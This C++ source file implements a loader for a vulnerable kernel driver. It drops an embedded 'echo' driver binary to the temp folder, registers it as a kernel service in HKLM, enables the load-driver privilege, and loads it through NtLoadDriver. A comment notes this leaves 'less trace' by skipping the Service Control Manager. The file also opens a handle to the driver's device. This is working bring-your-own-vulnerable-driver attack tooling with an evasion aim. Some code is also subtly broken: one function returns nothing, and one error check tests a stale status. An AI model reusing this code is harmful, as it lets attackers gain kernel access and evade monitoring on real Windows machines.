#include "vul_driver.h"

auto vul_driver::get_full_driver_path() const -> std::wstring
{
  const std::wstring temp_path = utils::get_temp_path();
  if (temp_path.empty())
  {
    std::cerr << "couldn't get temp path" << std::endl;
    return L"";
  }
  return temp_path + driver_name + L".sys";
}

auto vul_driver::install() const -> BOOL
{
  const std::wstring full_driver_path = get_full_driver_path();
  if (full_driver_path.empty())
  {
    std::cerr << "couldn't get full driver path" << std::endl;
    return FALSE;
  }
  // check if the driver already exists
  std::filesystem::path path(full_driver_path);
  if (std::filesystem::exists(path))
  {
    const int status = _wremove(full_driver_path.c_str());
    if (status != 0)
    {
      std::cerr << "something goes wrong with _wremove" << std::endl;
      return FALSE;
    }
  }

  std::ofstream sys_file(full_driver_path, std::ios::out | std::ios::binary);
  if (!sys_file)
  {
    std::cerr << "couldn't create file for writing the driver" << std::endl;
    return FALSE;
  }
  sys_file.write(reinterpret_cast<const char*>(echo_driver_resource::driver), sizeof(echo_driver_resource::driver));
  sys_file.close();
  return TRUE;
}

auto vul_driver::setup_reg_key() const -> BOOL
{
  const std::wstring services_path = SERVICE_PATH_COMMON + driver_name;
  const HKEY h_key_root = HKEY_LOCAL_MACHINE;
  const auto l_status = utils::open_reg_key(h_key_root, services_path.c_str());
  if (l_status == ERROR_SUCCESS)
  {
    std::cerr << "service key already exists" << std::endl;
    return FALSE;
  }

  HKEY h_service;
  if (RegCreateKeyW(h_key_root, services_path.c_str(), &h_service) != ERROR_SUCCESS)
  {
    std::cerr << "couldn't create service key" << std::endl;
    return FALSE;
  }
  const std::wstring global_namespace_driver_path = L"\\??\\" + get_full_driver_path();
  //set image path first
  const LSTATUS status = RegSetKeyValueW(h_service, NULL, L"ImagePath", REG_EXPAND_SZ,
                                         global_namespace_driver_path.c_str(),
                                         // wchar has double size of char
                                         (DWORD)(global_namespace_driver_path.size() * sizeof(wchar_t)));
  if (status != ERROR_SUCCESS)
  {
    RegCloseKey(h_service);
    std::cerr << "couldn't set ImagePath value" << std::endl;
    return FALSE;
  }

  const DWORD dwTypeValue = SERVICE_KERNEL_DRIVER;
  // set Type to service
  RegSetKeyValueW(h_service, NULL, L"Type", REG_DWORD, &dwTypeValue, sizeof(DWORD));
  if (status != ERROR_SUCCESS)
  {
    RegCloseKey(h_service);
    std::cerr << "couldn't set Type" << std::endl;
    return FALSE;
  }

  RegCloseKey(h_service);
  return TRUE;
}

auto vul_driver::load() const -> BOOL
{
  HMODULE ntdll = utils::get_ntdll();
  if (!ntdll)
  {
    std::cerr << "couldn't get ntdll handle" << std::endl;
    return FALSE;
  }
  const auto RtlAdjustPrivilege = reinterpret_cast<utils::RtlAdjustPrivilege>(GetProcAddress(
    ntdll, "RtlAdjustPrivilege"));
  const auto NtLoadDriver = reinterpret_cast<utils::NtLoadDriver>(GetProcAddress(ntdll, "NtLoadDriver"));
  if (!RtlAdjustPrivilege || !NtLoadDriver)
  {
    std::cerr << "couldn't get ntdll functions" << std::endl;
    return FALSE;
  }

  BOOLEAN old = FALSE;
  NTSTATUS status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &old);
  if (!NT_SUCCESS(status))
  {
    std::cerr << "couldn't adjust privilege " << "NTSTATUS is: " << std::hex << status << std::endl;
    return FALSE;
  }

  std::wstring wdriver_reg_path = L"\\Registry\\Machine\\" + SERVICE_PATH_COMMON + driver_name;
  UNICODE_STRING service_path;
  RtlInitUnicodeString(&service_path, wdriver_reg_path.c_str());

  // when you load your driver with NtLoadDriver, it won't be registered with the Service Control Manager (SCM). Less trace.
  status = NtLoadDriver(&service_path);
  // 0xC000010E is STATUS_IMAGE_ALREADY_LOADED
  if (status == 0xC000010E)
  {
    std::cout << "driver already loaded" << std::endl;
    return TRUE;
  }
  else if (!NT_SUCCESS(status))
  {
    std::cerr << "couldn't load driver " << "NTSTATUS is: " << std::hex << status << std::endl;;
    return FALSE;
  }
  return TRUE;
}

// L"\\Device\\echo", GENERIC_READ | GENERIC_WRITE
auto vul_driver::get_device_handle() -> BOOL
{
  HANDLE handle;
  OBJECT_ATTRIBUTES obj_attr;
  UNICODE_STRING uni_device_name;
  IO_STATUS_BLOCK io_status_block;

  RtlInitUnicodeString(&uni_device_name, device_name.c_str());

  InitializeObjectAttributes(&obj_attr, &uni_device_name,
                             OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  constexpr ULONG share_access = 0;
  constexpr ULONG open_options = 0;

  const NTSTATUS status = NtOpenFile(&handle,
                                     GENERIC_READ | GENERIC_WRITE,
                                     &obj_attr,
                                     &io_status_block,
                                     share_access,
                                     open_options);

  if (!NT_SUCCESS(status))
  {
    std::cerr << "Failed to open handle. Status code: " << std::hex << status << std::endl;
    h_device = nullptr;
    return FALSE;
  }
  // This handle has to be closed with CloseHandle(device_handle);
  h_device = handle;
  return TRUE;
}

auto vul_driver::uninstall() const -> BOOL
{
  // delete the driver file
  int ok = _wremove(get_full_driver_path().c_str());
  if (ok != 0)
  {
    return FALSE;
  }
  return TRUE;
}

auto vul_driver::cleanup() const -> BOOL
{
}

auto vul_driver::delete_reg_key() const -> BOOL
{
  const LSTATUS status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, (SERVICE_PATH_COMMON + driver_name).c_str());
  if (status != ERROR_SUCCESS)
  {
    if (status == ERROR_FILE_NOT_FOUND)
    {
      return TRUE;
    }
    std::cerr << "couldn't delete service key" << std::endl;
    return FALSE;
  }
  return TRUE;
}

auto vul_driver::unload() const -> BOOL
{
  const auto ntdll = utils::get_ntdll();
  if (!ntdll)
  {
    std::cerr << "couldn't get ntdll handle" << std::endl;
    return FALSE;
  }

  std::wstring wdriver_reg_path = L"\\Registry\\Machine\\" + SERVICE_PATH_COMMON + driver_name;
  UNICODE_STRING service_path;
  RtlInitUnicodeString(&service_path, wdriver_reg_path.c_str());

  const auto NtUnloadDriver = reinterpret_cast<utils::NtUnloadDriver>(GetProcAddress(ntdll, "NtUnloadDriver"));
  NTSTATUS status = NtUnloadDriver(&service_path);
  if (status != 0x0)
  {
    std::cerr << "couldn't unload driver " << "NTSTATUS is: " << std::hex << status << std::endl;
    delete_reg_key();
    return FALSE;
  }

  return TRUE;
}
